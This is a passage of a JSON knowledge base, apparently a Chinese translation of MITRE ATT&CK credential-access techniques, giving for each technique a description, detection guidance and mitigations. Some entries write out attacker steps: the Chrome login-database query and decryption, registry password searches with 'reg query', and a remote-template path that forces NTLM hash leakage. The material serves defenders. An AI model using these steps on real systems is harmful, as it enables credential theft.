		"detection": "<p><b>Windows</b></p><p>监控与lsass.exe交互的意外进程。Mimikatz等通用凭据导出程序通过打开进程，找到LSA secrets密钥并解密内存中存储凭据详细信息的区域来访问LSASS进程。凭据导出程序还可以通过使用反射式过程注入的方法来减少恶意活动的指示信息。</p><p>哈希转储程序在本地文件系统（%SystemRoot%/system32/config/SAM）上打开SAM，或创建注册表SAM密钥的转储来访问存储的账号密码哈希。有些哈希转储程序会打开本地文件系统作为设备并解析到SAM表来避开文件访问防御。其他转储程序会在读取哈希值之前对SAM表进行内存复制。检测攻击者已入侵并正在使用的有效账号也可能会有所帮助。</p><p>在Windows 8.1和Windows Server 2012 R2上，监控Windows日志中LSASS.exe的创建来验证LSASS作为受保护的进程启动。</p><p>监控程序执行的进程和命令行参数来查看是否有凭据导出相关的指示信息。远程访问工具可能包含内置功能或合并了Mimikatz等现有工具。还存在包含凭据导出功能的PowerShell脚本，例如PowerSploit的Invoke-Mimikatz模块，这可能还需要在操作系统中配置日志功能来收集必要的信息用于分析。</p><p>监控域控制器日志来查看是否有复制请求以及可能与DCSync相关的其他计划外活动。需要注意域控制器可能不会记录源自默认域控制器账号的复制请求。还需要监控网络协议以及来自已知域控制器不相关IP的其他复制请求。</p><p><b>Linux</b></p><p>要获取存储在内存中的密码和哈希，进程必须在/proc文件系统中打开待分析进程的映射文件。该文件存储在<code>/proc//maps</code>路径下。其中，目录是要查询此类身份认证数据程序的唯一pid。许多Linux发行版本中都带有AuditD监控工具，可用于监控在proc文件系统中打开此文件的恶意进程，并抛出含此类程序pid、进程名称和参数的警告。</p>",
		"mitigations": [{
			"name": "活动目录配置",
			"description": "管理“复制目录更改”的访问控制列表以及与域控制器复制相关的其他权限。"
		}, {
			"name": "凭据访问保护",
			"description": "在Windows 10中，微软实现了名为 “凭据保护”的新功能，来保护LSA secrets（LSA secrets可用于通过凭据导出来获取凭据）。默认情况下未配置此功能。若要配置此功能，需要满足硬件和固件系统要求。此功能还不能防止所有形式的凭据导出。"
		}, {
			"name": "操作系统配置",
			"description": "考虑禁用或限制NTLM。"
		}, {
			"name": "密码策略",
			"description": "确保本地管理员账号在网络上所有系统中都有复杂且唯一的密码。"
		}, {
			"name": "特权账号管理",
			"description": "Windows：除非用户或管理域账号受到严格控制，否则请勿将它们放在不同系统的本地管理员组中，因为这通常相当于在所有这些系统上使用有相同密码的本地管理员账号。遵循企业网络设计和管理的最佳实践，限制在不同管理层使用特权账号。"
		}, {
			"name": "特权进程完整性",
			"description": "在Windows 8.1和Windows Server 2012 R2上，为LSA启用Protected Process Light。"
		}, {
			"name": "用户培训",
			"description": "通过培训用户和管理员不要对多个账号使用相同密码来限制账号和系统之间的凭据重叠。"
		}],
		"tactics": ["TA0006"]
	},
	"name": "凭据转储"
}, {
	"id": "T1503",
	"description": "<p>攻击者可能会通过读取针对特定浏览器的文件来从web浏览器获取凭据。</p><p>Web浏览器通常会保存凭据，例如网站用户名和密码，以便将来无需手动输入它们。Web浏览器通常将凭据以加密格式存储在凭据存储区中。但是，存在从web浏览器中提取纯文本凭据的方法。</p><p>例如，Windows系统中，可以通过读取数据库文件AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data并执行SQL查询语句SELECTaction_url, username_value, password_value FROM logins;来从Google Chrome获取加密的凭据。然后，可以通过将加密的凭据传递到Windows API函数CryptUnprotectData，该函数会使用受害者的缓存登录凭据作为解密密钥，从而获得纯文本密码。</p><p>攻击者对常见web浏览器（如FireFox，Safari，Edge等）使用了类似的过程。</p><p>攻击者还可能会通过搜索web浏览器进程内存来获取通常与凭据匹配的模式，从而获取凭据。</p><p>从web浏览器获取凭据后，攻击者可能会尝试在不同系统和/或账户之间回收凭据，以扩大访问范围。如果从web浏览器获得的凭据与特权账户（例如域管理员）重叠的，这可能会大大加快攻击者实现他们的目标。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程监控", "PowerShel日志", "文件监控", "API 监控"]
	},
	"relations": {
		"detection": "<p>识别包含凭据（例如：Google Chrome登录数据库文件<code>AppData\\Local\\Google\\Chrome\\UserData\\Default\\Login Data</code>）的web浏览器文件。监控包含凭据的web浏览器文件读取事件，尤其是在读取进程与此web浏览器无关时。监控进程执行日志以包含PowerShell Transcription，重点关注多种行为组合的执行日志，包括读取web浏览器进程内存的相关日志、使用正则表达式的相关日志以及那些包含常见web应用程序（Gmail，Twitter，Office365等）多个关键字的日志。</p>",
		"mitigations": [{
			"name": "密码策略",
			"description": "组织可以考虑权衡将凭据存储在web浏览器中的风险。如果web浏览器凭据泄露是一个重要问题，则可以通过技术控制、策略和用户培训来防止在web浏览器中存储凭据。"
		}],
		"tactics": ["TA0006"]
	},
	"name": "Web浏览器凭据"
}, {
	"id": "T1081",
	"description": "<p>攻击者可能会在本地文件系统和远程文件共享中搜索包含密码的文件。这些文件可以是用户个人凭据的存储文件，一组用户共享凭据的存储文件，包含系统或服务密码的配置文件，或包含嵌入式密码的源代码/二进制文件。</p><p>可以通过凭据导出技术从备份或保存的虚拟机中提取密码。还可以从Windows域控制器上存储的组策略首选项中获取密码。</p><p>云环境中，经过验证的用户凭据通常存储在本地配置及凭据文件中。某些情况下，可以复制这些文件并在另外的机器上重复使用。或者，可以读取内容然后用于身份认证，而无需复制任何文件。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows", "AWS", "GCP", "Azure"],
		"permissionRequired": ["用户", "管理员", "系统"],
		"dataSources": ["文件监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>如果一开始不知道某些文件存在，那么检测攻击者对这些文件的访问可能很困难。即便如此，检测到攻击者使用已获取的凭据还是有可能的。监控执行进程的命令行参数来查看是否有表示正在搜索密码的可疑字词或正则表达式，例如：password，pwd，login，secure或credentials。更多信息，请参见“有效帐号”。</p>",
		"mitigations": [{
			"name": "活动目录配置",
			"description": "删除易受攻击的组策略首选项。"
		}, {
			"name": "审核",
			"description": "抢先搜索包含密码的文件。一旦发现，请采取措施降低风险。"
		}, {
			"name": "密码策略",
			"description": "建立禁止在文件中存储密码的组织策略。"
		}, {
			"name": "文件和目录权限限制",
			"description": "将文件共享限制为特定目录，仅允许必要的用户访问。"
		}, {
			"name": "用户培训",
			"description": "确保开发人员和系统管理员知道留在端点系统或服务器上的软件配置文件中使用明文密码的相关风险。"
		}],
		"tactics": ["TA0006"]
	},
	"name": "文件中的凭据"
}, {
	"id": "T1214",
	"description": "<p>Windows注册表存储系统或其他程序可以使用的配置信息。攻击者可能会查询注册表是否有存储供其他程序或服务使用的凭据和密码。有时，这些凭据用于自动登录。</p><p>用于查找密码信息相关的注册表项的命令举例如下：</p><p><code>·         </code>本地机器配置单元：<code>reg query HKLM /f password /t REG_SZ /s</code></p><p>·         当前用户配置单元：<code>reg query HKCU /f password /t REG_SZ /s</code></p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["Windows注册表", "进程命令行参数", "进程监控"]
	},
	"relations": {
		"detection": "<p>监控可用于查询注册表的应用进程（例如Reg），并收集那些可能表示有攻击者正在搜索凭据的命令参数。找出活动与可能表示攻击者正在主动入侵的可疑行为之间的关系，从而来减少误报。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "主动搜索注册表中的凭据。一旦发现，请尝试降低风险。"
		}, {
			"name": "密码策略",
			"description": "不要将凭据存储在注册表中。"
		}, {
			"name": "特权账号管理",
			"description": "如果软件凭据必须存储在注册表中，请确保关联的账号只有有限的权限，防止它们被攻击者获取而滥用。"
		}],
		"tactics": ["TA0006"]
	},
	"name": "注册表中的凭据"
}, {
	"id": "T1212",
	"description": "<p>软件漏洞攻击指的是攻击者利用程序、服务或操作系统软件或内核本身中的编程错误执行恶意代码。攻击者可能会将凭据和身份认证机制作为手段来获取有用凭据或绕过进程来获取系统访问权限。例如：MS14-068针对Kerberos，使用域用户权限来伪造Kerberos凭据。凭据访问利用还可能导致权限升级，具体取决于目标进程或所获取的凭据。</p>",
	"details": {
		"platform": ["Linux", "Windows", "macOS"],
		"permissionRequired": ["用户"],
		"dataSources": ["认证日志", "Windows错误报告", "进程监控"]
	},
	"relations": {
		"detection": "<p>软件利用检测可能很困难，具体取决于可用的工具。软件攻击可能并不会总是成功，或者可能导致被攻击的进程变得不稳定或崩溃。还要在系统上查找能表明攻击成功的行为，例如进程的异常行为。如果通过软件攻击获得的凭据平时不常使用或不常见，那么攻击者使用这些凭据时就会被检测到。</p>",
		"mitigations": [{
			"name": "应用隔离和沙箱",
			"description": "使用沙箱来使得攻击者很难利用未发现或未修补的漏洞来实施攻击操作。也可通过其他类型的虚拟化和应用微分段来减轻某些类型漏洞攻击的影响。但在这些系统中仍可能存在其他漏洞和缺陷攻击风险。"
		}, {
			"name": "漏洞攻击防护",
			"description": "可以使用安全应用程序，例如Windows Defender漏洞利用防护（WDEG）和增强缓和体验工具包（EMET），来检测攻击行为，从而缓解某些攻击行为的影响。也可通过控制流完整性检查来识别和阻止软件攻击。许多保护措施依赖于体系结构和目标应用二进制文件的兼容性，可能不适用于针对防御逃逸的软件。"
		}, {
			"name": "威胁情报程序",
			"description": "开发一个强大的网络威胁情报能力，用来确定哪些类型和级别的威胁可能会针对特定组织实施软件攻击和零日漏洞攻击。"
		}, {
			"name": "软件更新",
			"description": "对内部企业端点和服务器通过补丁管理来定期更新软件。"
		}],
		"tactics": ["TA0006"]
	},
	"name": "凭据访问利用"
}, {
	"id": "T1187",
	"description": "<p>服务器消息块（SMB）协议通常在Windows网络中用于系统之间的身份验证和通信，以访问资源和共享文件。Windows系统尝试连接到SMB资源时，它将自动尝试进行身份验证并将当前用户的凭据信息发送到远程系统。此行为在企业环境中很常见，因此用户无需输入凭据即可访问网络资源。当SMB被阻止或发生故障时，Windows系统通常将分布式创作和版本控制（WebDAV）用作备份协议。WebDAV是HTTP的扩展，通常在TCP端口80和443上运行。</p><p>攻击者可能会利用此行为通过强制SMB身份验证访问用户帐户哈希。攻击者可通过鱼叉式钓鱼向用户发送附件，该附件包含指向该攻击者控制的外部服务器的资源链接（即模板注入），或者将特制文件放置在特权帐户的导航路径上（例如，放在桌面上的.SCF文件）或放置在受害者可以访问的公共共享区。当用户系统访问不受信任的资源时，它将尝试进行身份验证，并通过SMB向攻击者控制的服务器发送包括用户凭据哈希值的相关信息。通过访问凭据哈希，攻击者可以执行离线暴力破解以获取纯文本凭据，或者将其重新用于“传递哈希”。</p><p>以上情况可以通过几种不同的方法发生。目前使用的方法的细节包括：</p><p>·         包含文档的鱼叉式钓鱼附件。该文档包含一旦文档打开即可自动加载的资源（即模板注入）。例如，该文档可以包括类似于<code>file[:]//[remote address]/Normal.dotm</code>的请求以触发SMB请求。</p><p>·         修改后的.LNK或.SCF文件。其图标文件名指向外部引用，例如<code>\\[remote address]\\pic.png</code>，这将强制系统在呈现图标时加载资源以重复收集凭据信息。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控", "网络协议分析", "网络设备日志", "进程使用网络"]
	},
	"relations": {
		"detection": "<p>监控TCP端口139和445以及UDP端口137上的SMB流量，以及试图流出到未知外部系统的WebDAV流量。如果检测到这种尝试，则调查端点数据源以查找根本原因。对于内部流量，请监控工作站之间的异常（与基线相比）SMB流量。对于多数网络，不应有任何这样的异常流量，但这取决于网络上的系统是如何配置的，以及资源的位置。</p><p>监控.LNK，.SCF或系统以及虚拟环境中包含指向外部网络资源的任何其他文件的创建和修改，因为在呈现文件时这些资源可用于收集凭据。</p>",
		"mitigations": [{
			"name": "过滤网络流量",
			"description": "通过出口过滤或阻止TCP端口139和445以及UDP端口137阻止SMB流量流出企业网络。过滤或阻止WebDAV协议流量流出网络。如果需要通过SMB和WebDAV访问外部资源，则应通过白名单严格限制流量。"
		}, {
			"name": "密码策略",
			"description": "使用强密码可以增加凭据哈希被破解的难度。"
		}],
		"tactics": ["TA0006"]
	},
	"name": "强制认证"
}, {
	"id": "T1056",
	"description": "<p>攻击者可能会通过捕捉用户输入的方式，包括键盘记录以及用户输入字段拦截，来获取有效账号以及信息收集需要的凭据。键盘记录是时下最流行的输入捕捉方式，它包括多种截取键盘输入的方法。但也存在基于特定目的的信息定位方法，例如执行UAC提示或包装Windows默认凭据提供程序。</p><p>当凭据导出尝试无效时，可能会使用键盘记录来给新访问机会获取凭据，但攻击者在机会出现之前需要在系统上保持被动状态一段时间。</p><p>攻击者还可能会在面向外部的门户（例如VPN登录页面）上安装代码来捕捉和传输尝试登录该服务的用户的凭据。攻击者可能会在入侵后使用这种输入捕捉技术变体，将合法管理员级访问作为通过外部远程服务和有效账号来保持网络访问的备份措施，或者作为利用面向外部的web服务初始入侵的一部分。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["Windows注册表", "内核驱动程序", "进程监控", "API监控"]
	},
	"relations": {
		"detection": "<p>键盘记录程序可以采用多种形式，可能包括修改注册表和安装驱动程序，设置Hook或轮询来拦截键盘输入。常常调用的API包括SetWindowsHook，GetKeyState和GetAsyncKeyState。监控注册表和文件系统中的此类更改并检测驱动程序安装，还要查看常见的键盘记录API调用。仅仅是API调用并不能表示有键盘记录，但是API调用可能会提供行为数据。这些数据与其他信息（例如，写入磁盘的新文件和异常进程）结合使用时就很有用。</p><p>监控注册表来查看是否有添加自定义凭据提供程序的情况。检测到攻击者正在使用已入侵的有效账号可能有助于获取攻击者使用新技术来拦截用户输入的结果。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0009", "TA0006"]
	},
	"name": "输入捕捉"
}, {
	"id": "T1141",
	"description": "<p>当执行程序需要比当前用户上下文中存在的权限更高时，操作系统通常会提示用户输入正确的凭据以授权该权限的提升从而完成该任务（例如：绕过用户帐户控制）。</p><p>攻击者可能会模仿此功能，以出于模仿正常使用的多种原因（例如需要额外访问的虚假安装程序或虚假恶意软件删除套件）来弹出看似合法的提示，提示用户提供凭据。此类提示可用于通过各种语言收集数据，例如：AppleScript和PowerShell。</p>",
	"details": {
		"platform": ["macOS", "Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程监控", "进程命令行参数", "用户接口", "PowerShell日志"]
	},
	"relations": {
		"detection": "<p>监控异常程序的进程执行以及可用于提示用户输入凭据的恶意脚本实例。</p><p>仔细审查输入提示中是否存在非法指标，例如非传统横幅，文本，时间和/或来源。</p>",
		"mitigations": [{
			"name": "用户培训",
			"description": "通过用户培训来提高用户意识并引发用户对潜在恶意事件的怀疑（例如：提示输入凭据的Office文档）。"
		}],
		"tactics": ["TA0006"]
	},
	"name": "输入提示"
}, {
	"id": "T1208",
	"description": "<p>服务主体名称（SPN）用于唯一标识Windows服务的每个实例。要启用身份验证，Kerberos要求SPN与至少一个服务登录帐户（专门负责运行服务的帐户）相关联。</p><p>拥有有效Kerberos票证授予票证（TGT）的攻击者可能会从域控制器（DC）请求任何SPN的一个或多个Kerberos票证授予服务（TGS）的服务票证。可以使用RC4算法对这些票证的一部分进行加密，这意味着与SPN关联的服务帐户的Kerberos 5 TGS-REP etype 23哈希将用作私钥，因此容易受到离线暴力破解攻击从而可能暴露明文凭据。</p><p>可以使用从网络流量捕获的服务票证来执行相同的攻击。</p><p>被破解的哈希可以通过访问有效账户实现持久性，权限提升和横向移动。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["Windows事件日志"]
	},
	"relations": {
		"detection": "<p>启用审核Kerberos服务票证操作以记录Kerberos TGS服务票证请求的日志。特别是调查不规则的活动模式（例如：帐户在很短的时间内发出大量请求，事件4769，尤其是如果同时也请求RC4加密[类型0x17]）。</p>",
		"mitigations": [{
			"name": "加密敏感信息",
			"description": "尽可能启用AES Kerberos加密（或其他更强大的加密算法），而不是RC4。"
		}, {
			"name": "密码策略",
			"description": "确保服务帐户的密码长度（理想情况下为25个字符以上）和复杂性，并且启用密码过期功能。同时可以考虑使用组托管服务帐户或其他第三方产品，例如密码存储。"
		}, {
			"name": "特权账户管理",
			"description": "限制服务帐户使用所需最小权限，包括域管理员等特权组的成员身份。"
		}],
		"tactics": ["TA0006"]
	},
	"name": "Kerberoasting"
}, {
	"id": "T1142",
	"description": "<p>Keychain是macOS跟踪用户密码和凭据的内置方式，用于许多服务和功能，如WiFi密码，网站，安全说明，证书和Kerberos。Keychain文件位于<code>~/Library/Keychains/</code>，<code>/Library/Keychains/</code>和<code>/Network/Library/Keychains/</code>。<code>security</code>实用程序（默认情况下内置于macOS中）提供了管理这些凭据信息的有用方法。</p><p>要管理其凭据，用户必须使用其他凭据来访问其Keychain。如果攻击者知道登录keychain的凭据，则他们可以访问存储在此库中的所有其他凭据.。默认情况下，keychain的密码短语是用户的登录凭据。</p>",
	"details": {
		"platform": ["macOS"],
		"permissionRequired": ["管理员"],
		"dataSources": ["系统调用", "进程监控"]
	},
	"relations": {
		"detection": "<p>解锁keychain并使用密码是一个非常常见的过程，因此任何检测技术都可能存在很多噪音。监控对keychain的系统调用可以帮助确定是否有可疑进程试图访问它。</p>",
		"mitigations": [{
			"name": "密码策略",
			"description": "可以从用户的登录密码更改用户登录keychain的密码。对于攻击者而言，这增加了破译复杂性，因为他们需要知道额外的密码。"
		}],
		"tactics": ["TA0006"]
	},
	"name": "Keychain"
}, {
	"id": "T1171",
	"description": "<p>链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）是Microsoft Windows组件，可用作主机标识的替代方法。LLMNR基于域名系统（DNS）格式，允许同一本地链路上的主机为其他主机执行名称解析。NBT-NS通过NetBIOS名称识别本地网络上的系统。</p><p>攻击者可以通过响应LLMNR（UDP 5355）/NBT-NS（UDP 137）流量来欺骗受害网络上的权威名称解析源，就好像他们知道所请求主机的身份一样，从而有效地攻击服务以便受害者与被攻击者控制的系统进行通信。如果请求的主机属于需要标识/身份验证的资源，则用户名和NTLMv2哈希将被发送到攻击者控制的系统。然后，攻击者可以通过端口流量监控工具或通过网络嗅探收集通过线路发送的哈希信息，并通过暴力破解技术离线破解哈希以获取明文密码。在某些情况下，如果攻击者可以访问位于身份验证路径中的系统，或者当使用凭据的自动扫描功能尝试对攻击者控制的系统进行身份验证时，NTLMv2哈希可以拦截和中继，以访问目标系统和执行代码。中继步骤可以与系统中毒一起发生，但也可以独立于系统中毒。</p><p>存在一些可用于毒害本地网络中的名称服务的工具，例如NBNSpoof，Metasploit和Responder。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["Windows事件日志", "Windows注册表", "网络抓包", "Netflow/Enclave技术网络流分析"]
	},
	"relations": {
		"detection": "<p>监控<code>HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient</code>下是否有对“EnableMulticast”DWORD值的更改。值“0”表示LLMNR被禁用。</p><p>如果根据安全策略禁用了LLMNR/NetBIOS，则监控端口UDP 5355和UDP 137上的流量。</p><p>部署LLMNR/NBT-NS欺骗检测工具。监控Windows事件日志中的事件4697和7045有助于检测执行成功的中继技术。</p>",
		"mitigations": [{
			"name": "禁用或删除功能或程序",
			"description": "如果环境中不需要，则在本地计算机安全设置中禁用LLMNR和NetBIOS，或者按组策略禁用它们。"
		}, {
			"name": "过滤网络流量",
			"description": "使用基于主机的安全软件来阻止LLMNR/NetBIOS流量。启用SMB签名可以阻止NTLMv2中继攻击。"
		}],
		"tactics": ["TA0006"]
	},
	"name": "LLMNR/NBT-NS中毒和中继"
}, {
	"id": "T1040",
	"description": "<p>网络嗅探是指使用系统上的网络接口来监控或捕捉通过有线或无线连接发送的信息。攻击者可能会将网络接口设置为混杂模式来被动地访问网络中传输的数据，也可能会使用端口镜像来获取大量数据。</p><p>通过此技术捕捉的数据可能包括用户凭据，尤其是通过不安全、未加密协议发送的用户凭据。攻击者也可能会使用名称解析服务下毒技术（例如LLMNR / NBT-NS下毒和中继）通过重定向流量来捕捉网站、代理和内部系统的凭据。</p><p>网络嗅探还可能会透露配置详细信息，例如正在运行的服务，版本号和后续横向移动和/或防御逃逸活动所需的其他网络特征（例如：IP地址，主机名，VLAN ID）。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["网络设备日志", "主机网络接口", "Netflow/Enclave技术网络流分析", "进程监控"]
	},
	"relations": {
		"detection": "<p>检测导致网络流量嗅探的事件可能是最好的检测方法。从主机级别来看，攻击者可能需要对有线网络上的其他设备实施中间人攻击，从而捕捉非来往于当前已入侵系统的流量。信息流的这种变化可以在飞地网络级别检测到。监控ARP欺骗和免费ARP广播。检测已入侵的网络设备更具挑战性。需要审核管理员的登录、配置更改和设备映像才能检测到恶意更改。</p>",
		"mitigations": [{
			"name": "敏感信息加密",
			"description": "确保所有有线和/或无线流量均已正确加密。遵循认证协议最佳实践（例如Kerberos），并确保可能包含凭据的web流量受到SSL / TLS保护。"
		}, {
			"name": "多因子认证",
			"description": "尽可能使用多因子身份认证。"
		}],
		"tactics": ["TA0006", "TA0007"]
	},
	"name": "网络嗅探"
}, {
	"id": "T1174",
	"description": "<p>Windows密码过滤器提供了域账号和本地账号的密码策略实施机制。过滤器被实现为动态链接库，它提供了一种方法来验证可能违反了密码策略的密码。过滤器动态链接库可以位于本地计算机用于验证本地账号，和/或位于域控制器用于验证域账号。</p><p>新密码注册到SAM中之前，LSA要求每个注册的过滤器都来验证此密码。在每个注册的过滤器都确认此密码有效之前，任何更改都不会生效。</p><p>攻击者可能会注册恶意密码过滤器来从本地计算机和/或整个域中获取凭据。要执行正确的验证，筛选器必须从LSA接收纯文本凭据。每次提出密码请求时，恶意密码过滤器都会接收这些纯文本凭据。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["动态链接库监控", "进程监控", "Windows注册表"]
	},
	"relations": {
		"detection": "<p>监控来自或去往陌生密码过滤器的更改通知。</p><p>新安装的密码过滤器必须在系统重启后才会生效。</p><p>密码过滤器在lsass.exe中显示为自动运行并加载的动态链接库。</p>",
		"mitigations": [{
			"name": "操作系统配置",
			"description": "确保注册的密码过滤器都有效。域控制器和/或本地计算机的Windows安装目录（默认为C:\\Windows\\System32\\）中必须要有过滤器动态链接库，并且在HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages中有相应的条目。"
		}],
		"tactics": ["TA0006"]
	},
	"name": "密码过滤DLL"
}, {
	"id": "T1145",
	"description": "<p>专用加密密钥和证书用于身份认证，加密/解密和数字签名。</p><p>攻击者可能会从入侵的系统中收集私钥，用于对SSH等远程服务的身份认证，或用于解密其他收集的文件（如电子邮件）。通用密钥和证书文件扩展名包括：.key，.pgp，.gpg，.ppk，.p12，.pem，.pfx，.cer，.p7b，和.asc。攻击者还可能会在常用密钥目录中查找密钥，比如在基于* nix的系统上的<code>~/.ssh</code>目录里查找SSH密钥，或在Windows系统上的<code>C:\\Users(username).ssh\\</code>目录里查找SSH密钥。</p><p>私钥应需要输入密码或密码短语才能进行操作。因此，攻击者还可能会使用键盘记录来捕捉输入或尝试离线暴力破解密码短语。</p><p>已经发现了攻击者使用工具搜索入侵的系统以寻找与加密密钥及证书有关的文件扩展名。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控"]
	},
	"relations": {
		"detection": "<p>监控对加密密钥和证书相关文件和目录的访问行为。如果有这种访问行为，可能表示有收集和渗漏相关的活动。收集身份认证日志并查看是否有异常行为可能表示攻击者恶意使用密钥或证书进行远程身份认证。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "确保只允许授权密钥定期访问关键资源和审核访问列表。"
		}, {
			"name": "敏感信息加密",
			"description": "如果可能，请将密钥存储在单独的加密硬件上，而不是存储在本地系统上。"
		}, {
			"name": "网络分区",
			"description": "使用单独的基础设施来管理关键系统，防止系统上的凭据和权限重叠用于横向移动。"
		}, {
			"name": "密码策略",
			"description": "对私钥使用强密码短语，使破解变得困难。"
		}],
		"tactics": ["TA0006"]
	},
	"name": "私钥"
}, {
	"id": "T1167",
	"description": "<p>在El Capitan之前的OS X中，具有root访问权限的用户可以读取已登录用户的明文keychain密码，因为Apple的keychain实现允许缓存这些凭据，以便不会反复提示用户输入密码。Apple的securityd实用程序会获取用户的登录密码，使用PBKDF2对其进行加密，并将此主密钥存储在内存中。Apple还使用一组密钥和算法来加密用户的密码，但是一旦找到主密钥，攻击者只需要遍历其他值即可解锁最终密码。</p><p>如果攻击者可以获得root访问权限（允许他们读取securityd的内存），那么他们可以扫描内存以在相对较少的尝试中找到正确的密钥序列来解密用户的登录keychain。这为攻击者提供了用户，WiFi，邮件，浏览器，证书，安全备注等所有明文密码。</p>",
	"details": {
		"platform": ["macOS"],
		"permissionRequired": ["root用户"],
		"dataSources": ["进程监控"]
	},
	"relations": {
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0006"]
	},
	"name": "Securityd内存"
}, {
	"id": "T1528",
	"description": "<p>攻击者可以窃取用户应用程序访问令牌，用于访问远程系统和资源。这可以通过社会工程学来实现，通常需要用户操作来授予访问权限。</p><p>应用程序访问令牌用于代表用户发出授权API请求，并且通常用于访问云化应用程序和软件即服务（SaaS）中的资源。OAuth是一个常用的实现框架，它向用户颁发系统访问令牌。如果应用程序想要访问云化服务或受保护的API，可以通过各种授权协议使用OAuth 2.0来获得访问权限。一个常见的示例是Microsoft的授权码授予流程。OAuth访问令牌使得第三方应用程序可以按照应用程序请求的方式与包含用户数据的资源进行交互，而无需获取用户凭据。</p><p>攻击者可能会利用OAuth授权，方法是构造恶意应用程序，并设计此应用程序为使用目标用户的OAuth令牌来访问资源。攻击者需要在授权服务器上（例如，使用Azure门户、Visual Studio IDE、命令行界面、PowerShell或REST API调用的Microsoft Indentity Platform）完成其应用程序的注册。然后，他们可以发送网络钓鱼链接给目标用户，诱使用户授予应用程序访问权限。一旦授予了OAuth访问令牌，应用程序就可以通过“应用程序访问令牌”来获取对用户账户功能可能的长期访问。</p><p>已发现有攻击者针对Gmail、Microsoft和Yahoo Mail用户使用此技术。</p>",
	"details": {
		"platform": ["SaaS", "Office 365", "Azure AD"],
		"permissionRequired": ["用户"],
		"dataSources": ["Azure活动日志", "OAuth审核日志"]
	},
	"relations": {
		"detection": "<p>管理员应实施监控，以便在满足策略标准时触发自动警报。例如，管理员可以使用云访问安全代理（CASB）创建“高严重性应用程序权限”策略，该策略在应用程序请求高严重性权限或向太多用户发送权限请求时生成警报。</p><p>安全分析员可以使用其CASB、身份提供商或资源提供商（取决于平台）中的可用工具来查找恶意应用。例如，他们可以筛选少数用户授权的应用程序，要求高风险权限的应用，与应用用途不一致的权限，或带有旧的“上次授权”字段的应用。可以使用记录应用已执行活动的活动日志来调查特定的应用，尽管某些活动可能会误记为是用户正在执行的。应用商店可能有助于进一步调查可疑应用。</p><p>管理员可以设置各种日志并利用审核工具来监控OAuth 2.0访问而导致的操作。例如，管理员可以通过审核报告来识别权限提升操作，比如角色创建或策略修改。这些操作可能是在初始访问之后执行的。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "管理员应该对所有OAuth应用程序及其被授予的组织数据访问权限进行审核。为确立基线，应在所有应用程序上广泛开展此操作，然后定期对新的或更新的应用程序进行审核。应调查并删除可疑应用程序。"
		}, {
			"name": "Web内容限制",
			"description": "管理员可以阻止最终用户同意OAuth应用程序，从而禁止用户通过OAuth 2.0对第三方应用程序进行授权，并给所有请求强制管理同意。他们还可以阻止用户注册最终用户的应用程序，以降低风险。还可以用云访问安全代理来禁止应用程序。"
		}, {
			"name": "用户账户管理",
			"description": "可使用云访问安全代理（CASB）来设置使用策略并管理云应用程序上的用户权限，以防止访问应用程序访问令牌。"
		}, {
			"name": "用户培训",
			"description": "需要对用户进行培训，不允许他们对不可识别的应用程序进行授权。用户应特别注意重定向URL：如果URL是由一串与预期服务或SaaS应用相关的、拼错的或混乱的单词组成，则该网站可能试图欺骗合法服务。用户还应该对他们授予应用程序的权限保持谨慎。例如，应该对脱机访问和读取电子邮件的访问给与高度怀疑，因为攻击者可能会利用SaaS API来发现凭据和其他敏感通信。"
		}],
		"tactics": ["TA0006"]
	},
	"name": "窃取应用程序访问令牌"
}, {
	"id": "T1539",
	"description": "<p>攻击者可能会窃取web应用程序或服务会话cookie，并以已认证的用户身份使用它们来获取访问web应用程序或Internet服务的权限，而无需使用凭据。用户通过网站的身份认证后，web应用程序和服务通常将会话cookie用作身份认证令牌。</p><p>即使没有积极频繁使用web应用程序，cookie通常也会在很长一段时间内有效。可在磁盘、浏览器的进程内存和远程系统的网络通信中找到cookie。此外，目标机器上的其他应用程序（例如，云服务验证的应用程序）可能会在内存中存储敏感身份认证cookie。会话cookie可用于绕过某些多因子身份认证协议。</p><p>已知几个针对本地系统web浏览器cookie的恶意软件。还有一些开源框架，例如Evilginx 2和Mauraena，它们可以通过中间人代理来收集会话cookie，而中间人代理可以由攻击者设置并用于网络钓鱼攻击活动。</p><p>获取有效cookie后，攻击者可以执行“web会话cookie”攻击技术登录到相应的web应用程序。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows", "Office 365", "SaaS"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控", "API 监控"]
	},
	"relations": {
		"detection": "<p>在存储浏览器会话cookie的本地系统上监控读取文件及存储库的尝试。监控程序注入或转储浏览器进程内存的尝试。</p>",
		"mitigations": [{
			"name": "多因子认证",
